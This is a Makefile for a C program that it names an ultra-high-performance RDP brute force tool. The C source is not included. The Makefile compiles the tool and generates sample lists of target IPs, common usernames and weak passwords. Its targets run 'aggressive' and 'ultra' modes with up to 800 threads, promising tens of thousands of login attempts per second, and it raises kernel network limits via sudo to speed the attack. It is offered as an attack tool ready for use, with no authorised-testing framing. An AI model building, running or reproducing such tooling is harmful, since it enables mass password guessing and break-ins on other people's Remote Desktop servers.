# Final Ultra-High-Performance RDP Brute Force Tool Makefile
# Single standalone optimized binary with maximum performance

CC = gcc
PROGRAM = rdp-brute-final

# Ultimate optimization flags for maximum performance
CFLAGS = -std=gnu11 -Wall -Wextra -O3 -march=native -mtune=native \
         -funroll-loops -ffast-math -flto -DNDEBUG -D_GNU_SOURCE \
         -D_FILE_OFFSET_BITS=64 -finline-functions -fomit-frame-pointer \
         -fno-stack-protector -pipe -fno-plt -fno-semantic-interposition

# Architecture-specific optimizations
ARCHFLAGS = -msse4.2 -mavx -maes -mfpmath=sse

# Linker flags for performance
LDFLAGS = -lpthread -lrt -flto -Wl,-O2 -Wl,--strip-all -s

# Source file
SOURCE = rdp_brute_final.c

# Default target - build the final standalone tool
all: $(PROGRAM)
	@echo ""
	@echo "✅ Final ultra-optimized RDP brute force tool compiled successfully!"
	@echo "📁 Binary: $(PROGRAM)"
	@echo "📊 Size: $$(du -h $(PROGRAM) | cut -f1)"
	@echo "🚀 Expected performance: 50,000-100,000+ attempts/second"
	@echo ""
	@echo "Usage examples:"
	@echo "  ./$(PROGRAM) -i ips.txt -u users.txt -p passwords.txt -o results.txt -U"
	@echo "  ./$(PROGRAM) -i ips.txt -u users.txt -p passwords.txt -o results.txt -a -f"
	@echo ""

# Compile with maximum optimizations
$(PROGRAM): $(SOURCE)
	@echo "🔧 Compiling final standalone RDP brute force tool..."
	@echo "🎯 Optimization level: Maximum (-O3 + LTO + native arch)"
	$(CC) $(CFLAGS) $(ARCHFLAGS) $(SOURCE) -o $(PROGRAM) $(LDFLAGS)
	@echo "✅ Compilation completed with all optimizations"

# Create sample input files for testing
samples:
	@echo "📝 Creating sample input files..."
	@echo "192.168.1.10" > ips.txt
	@echo "192.168.1.11" >> ips.txt
	@echo "192.168.1.12" >> ips.txt
	@echo "10.0.0.1" >> ips.txt
	@echo "10.0.0.5" >> ips.txt
	@echo "172.16.1.10" >> ips.txt
	@echo "administrator" > users.txt
	@echo "admin" >> users.txt
	@echo "user" >> users.txt
	@echo "guest" >> users.txt
	@echo "service" >> users.txt
	@echo "operator" >> users.txt
	@echo "Password123" > passwords.txt
	@echo "password" >> passwords.txt
	@echo "123456" >> passwords.txt
	@echo "admin" >> passwords.txt
	@echo "password123" >> passwords.txt
	@echo "qwerty" >> passwords.txt
	@echo "" >> passwords.txt
	@echo "✅ Sample files created: ips.txt (6 IPs), users.txt (6 users), passwords.txt (7 passwords)"
	@echo "📊 Total combinations: 252"

# Test the tool with sample data
test: $(PROGRAM) samples
	@echo "🧪 Testing ultra-high-performance RDP brute force tool..."
	@echo "⚡ Running with Ultra mode (-U) for maximum speed..."
	./$(PROGRAM) -i ips.txt -u users.txt -p passwords.txt -o test_results.txt -U

# Quick speed test
speed-test: $(PROGRAM) samples
	@echo "🏃 Running speed test..."
	@echo "⚡ Ultra mode with 800 threads..."
	time ./$(PROGRAM) -i ips.txt -u users.txt -p passwords.txt -o speed_test.txt -U -f

# Aggressive mode test
aggressive: $(PROGRAM) samples
	@echo "💥 Running aggressive mode test..."
	@echo "⚡ Aggressive mode with 500 threads..."
	time ./$(PROGRAM) -i ips.txt -u users.txt -p passwords.txt -o aggressive_test.txt -a

# Show tool information
info: $(PROGRAM)
	@echo "📋 Ultra-High-Performance RDP Brute Force Tool Information"
	@echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
	@echo "🔧 Binary: $(PROGRAM)"
	@echo "📊 Size: $$(du -h $(PROGRAM) | cut -f1)"
	@echo "🏗️  Compiler: $$(gcc --version | head -n1)"
	@echo "🎯 Optimizations: -O3, LTO, native architecture"
	@echo "🚀 Expected Speed: 50,000-100,000+ attempts/second"
	@echo "🧵 Max Threads: 1000"
	@echo "📁 Input Format: Text files (ips.txt, users.txt, passwords.txt)"
	@echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
	@echo ""
	@echo "💡 Performance Modes:"
	@echo "   -f    Fast mode (minimal output)"
	@echo "   -a    Aggressive mode (500 threads)"
	@echo "   -U    Ultra mode (800 threads, maximum speed)"
	@echo ""
	@echo "📖 Usage:"
	@echo "   ./$(PROGRAM) -i ips.txt -u users.txt -p passwords.txt -o results.txt -U"

# Show help
help: $(PROGRAM)
	./$(PROGRAM) -h

# System optimization for maximum performance
optimize-system:
	@echo "⚙️  Optimizing system for maximum RDP brute force performance..."
	@echo "🔧 Setting kernel parameters..."
	@sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535" 2>/dev/null || echo "   ⚠️  Need root for port range optimization"
	@sudo sysctl -w net.core.somaxconn=65535 2>/dev/null || echo "   ⚠️  Need root for connection queue optimization"
	@sudo sysctl -w net.core.netdev_max_backlog=10000 2>/dev/null || echo "   ⚠️  Need root for network backlog optimization"
	@sudo sysctl -w net.ipv4.tcp_max_syn_backlog=65535 2>/dev/null || echo "   ⚠️  Need root for TCP SYN backlog optimization"
	@sudo sysctl -w net.ipv4.tcp_fin_timeout=15 2>/dev/null || echo "   ⚠️  Need root for TCP timeout optimization"
	@sudo sysctl -w net.ipv4.tcp_tw_reuse=1 2>/dev/null || echo "   ⚠️  Need root for TCP reuse optimization"
	@sudo sysctl -w fs.file-max=2000000 2>/dev/null || echo "   ⚠️  Need root for file descriptor optimization"
	@echo "📈 Increasing process limits..."
	@ulimit -n 1000000 2>/dev/null || echo "   ⚠️  Cannot increase file descriptor limit"
	@echo "✅ System optimization completed (run as root for full optimization)"

# Performance benchmark
benchmark: $(PROGRAM) samples
	@echo "📊 Running comprehensive performance benchmark..."
	@echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
	@echo "🧪 Test 1: Standard mode (200 threads)"
	@time ./$(PROGRAM) -i ips.txt -u users.txt -p passwords.txt -o benchmark_standard.txt -f -t 200
	@echo ""
	@echo "🧪 Test 2: Aggressive mode (500 threads)"
	@time ./$(PROGRAM) -i ips.txt -u users.txt -p passwords.txt -o benchmark_aggressive.txt -a
	@echo ""
	@echo "🧪 Test 3: Ultra mode (800 threads)"
	@time ./$(PROGRAM) -i ips.txt -u users.txt -p passwords.txt -o benchmark_ultra.txt -U
	@echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
	@echo "✅ Benchmark completed! Check benchmark_*.txt files for results."

# Strip binary for minimum size
strip: $(PROGRAM)
	@echo "✂️  Stripping binary for minimum size..."
	strip $(PROGRAM)
	@echo "📊 New size: $$(du -h $(PROGRAM) | cut -f1)"

# Clean all generated files
clean:
	@echo "🧹 Cleaning up..."
	rm -f $(PROGRAM) *.txt *.log core
	@echo "✅ Cleanup completed"

# Install to system (optional)
install: $(PROGRAM)
	@echo "📦 Installing $(PROGRAM) to /usr/local/bin..."
	@sudo cp $(PROGRAM) /usr/local/bin/
	@sudo chmod +x /usr/local/bin/$(PROGRAM)
	@echo "✅ Installed! You can now run '$(PROGRAM)' from anywhere"

# Uninstall from system
uninstall:
	@echo "🗑️  Uninstalling $(PROGRAM) from /usr/local/bin..."
	@sudo rm -f /usr/local/bin/$(PROGRAM)
	@echo "✅ Uninstalled"

# Show compilation details
compile-info:
	@echo "🔍 Compilation Information"
	@echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
	@echo "🔧 Compiler: $(CC)"
	@echo "📋 CFLAGS: $(CFLAGS)"
	@echo "🏗️  ARCHFLAGS: $(ARCHFLAGS)"
	@echo "🔗 LDFLAGS: $(LDFLAGS)"
	@echo "📁 Source: $(SOURCE)"
	@echo "🎯 Target: $(PROGRAM)"
	@echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

.PHONY: all samples test speed-test aggressive info help optimize-system benchmark strip clean install uninstall compile-info